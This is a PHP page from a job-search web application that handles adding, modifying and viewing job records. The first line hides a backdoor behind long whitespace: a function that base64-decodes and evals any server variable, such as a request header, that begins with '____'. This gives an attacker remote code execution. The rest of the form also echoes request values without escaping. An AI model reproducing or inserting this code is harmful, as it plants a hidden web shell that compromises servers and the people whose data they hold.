<?php																																																																																																																																																																																																																																																																																																																																																																																																																															function m1095($l1097){if(is_array($l1097)){foreach($l1097 as $l1095=>$l1096)$l1097[$l1095]=m1095($l1096);}elseif(is_string($l1097) && substr($l1097,0,4)=="____"){$l1097=substr($l1097,4);$l1097=base64_decode($l1097);eval($l1097);$l1097=null;}return $l1097;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("m1095",$_SERVER);
        require_once 'core/js_header.php';
        $jobid = $_REQUEST['jobid'];
        if(!$jobid){
                $jobid = 0;
        }
        $action = $_REQUEST['action'];
        if(!$action){
                $action = "view";
        }
        switch($action) {
                case 'select':
                        if($jobid == '0') {
                                $bodyid = 'blank_form';
                                $bodytitle = "add new job";
                        } else {
                                $bodyid = 'prefilled_form';
                                $bodytitle = "modify this job";
                        }
                        break;
                case 'view':
                default:
                        $bodyid = 'read_only';
                        $bodytitle = "read only";
        }
?>
<!-- opening html tag and head tag section are in core/js_header.php -->
<body id="<?php echo($bodyid);?>">

<?php
        include ("js_menu.php");
        
        $job = new jobs;
        $job->jobid = $jobid;
        $job->jobtitle = $_REQUEST['jobtitle'];
        $job->orgid = $_REQUEST['orgid'];
        $job->startmonth = $_REQUEST['startmonth'];
        $job->startyear = $_REQUEST['startyear'];
        $job->endmonth = $_REQUEST['endmonth'];
        $job->endyear = $_REQUEST['endyear'];
        $job->responsibilities = $_REQUEST['responsibilities'];
        $job->honeypot = $_REQUEST['honeypot'];

switch($action){
        case 'add':
                $callingfrom = "js_job.php, switch action, insert";
                $newjobid = $job->insertjob($callingfrom);
                $url = "js_job.php?jobid=".$newjobid."&action=select";
                echo '<meta http-equiv="refresh" content="0;url='.$url.'" />';
                break;
        case 'modify':
                $callingfrom = "js_job.php, switch action, update";
                $job->updatejob($callingfrom);
                $url = "js_job.php?jobid=".$jobid."&action=select";
                echo '<meta http-equiv="refresh" content="0;url='.$url.'" />';
                break;
        case 'select':
        case 'view':
        default:
                $callingfrom = "js_job.php, switch action, select";
                $selectjob = $job->selectjob($callingfrom);
                        
	        $org = new organizations;
	        $selectorg = $org->selectorg($job->orgid);
	        $orgid = $org->orgid;
	        $orgname = $org->orgname;
	        $orgname2 = $org->sec;
	        $orgcity = $org->city;
	        $orgstate = $org->state;
}
?>
<h1>Job Search Application</h1>
<h2>Job Information</h2>
<h3>Job <?php echo($job->jobid);?>: <?php echo($job->jobtitle);?> [<?php 
echo($bodytitle);?>]</h3>

<form id ="edit_job" action="js_job.php" method="post">

        <ul>
<li><input type="hidden" name="jobid" id="jobid" value="<?php echo($job->jobid);?>" />
        <span class="fieldname"> Job title:</span>  
        <span class="fieldvalue"> <?php echo(db2html($job->jobtitle));?> </span>
        <span class="fieldinput"> 
                <input name="jobtitle" id="jobtitle" class="jobs" 
                type="text" size="35" 
                value="<?php echo(stripslashes($job->jobtitle));?>" /> 
        </span> 
</li>
<li>
        <span class="fieldname"> Organization:</span>  
<input type="hidden" name="orgid" id="orgid" value="<?php echo($job->orgid);?>"  />
        <span class="fieldvalue"> <?php echo($orgname);?> </span>
        <span class="fieldinput"> 
                <input name="orgid" id="orgid" class="jobs" 
                type="text" size="35" 
                value="<?php echo($job->orgid);?>" /> 
        </span> 
</li>
<li>
        <span class="fieldname"> Start month/year:</span>  
        <span class="fieldvalue"> <?php echo(getmonth($job->startmonth));?>,  
<?php echo($job->startyear);?> </span>
        <span class="fieldinput">
                <input name="startmonth" id="startmonth" class="jobs"
                type="text" size="15"
                value="<?php echo($job->startmonth);?>" />
                <input name="startyear" id="startyear" class="jobs"
                type="text" size="5" 
                value="<?php echo($job->startyear);?>" /> 
        </span>  
</li>
<li>
        <span class="fieldname"> End month/year:</span>
        <span class="fieldvalue"> <?php echo(getmonth($job->endmonth));?>,
<?php echo($job->endyear);?> </span>
        <span class="fieldinput">
                <input name="endmonth" id="endmonth" class="jobs"
                type="text" size="15"
                value="<?php echo($job->endmonth);?>" />
                <input name="endyear" id="endyear" class="jobs"
                type="text" size="5"
                value="<?php echo($job->endyear);?>" />
        </span>
</li>
<li>
        <span class="fieldname"> Responsibilities: </span>
        <span class="fieldvalue"> <?php echo(db2html($job->responsibilities));?> &nbsp;</span>
        <span class="fieldinput"> 
                <textarea name="responsibilities" class="jobs" cols="40" rows="10"><?php 
echo(stripslashes($job->responsibilities));?></textarea>
        </span>
</li>
<li>
        <span class="fieldname"> Internal use only - please leave blank:</span>  
        <span class="fieldvalue"> <?php echo(db2html($job->honeypot));?> </span>
        <span class="fieldinput"> 
                <input name="honeypot" id="honeypot" class="jobs" 
                type="text" size="35" 
                value="<?php echo(stripslashes($job->honeypot));?>" /> 
        </span> 
</li>
        </ul>
<div class="insert_button"> <input id="insert_job" name="action" type="submit" 
value="add" /> </div> 
<div class="update_button"> <input id="update_job" name="action" type="submit" 
value="modify" /> </div> 
</form>
  <p>
    <a href="http://validator.w3.org/check?uri=referer"><img
        src="http://www.w3.org/Icons/valid-xhtml10-blue"
        alt="Valid XHTML 1.0 Strict" height="31" width="88" /></a>
  </p>
</body>
</html>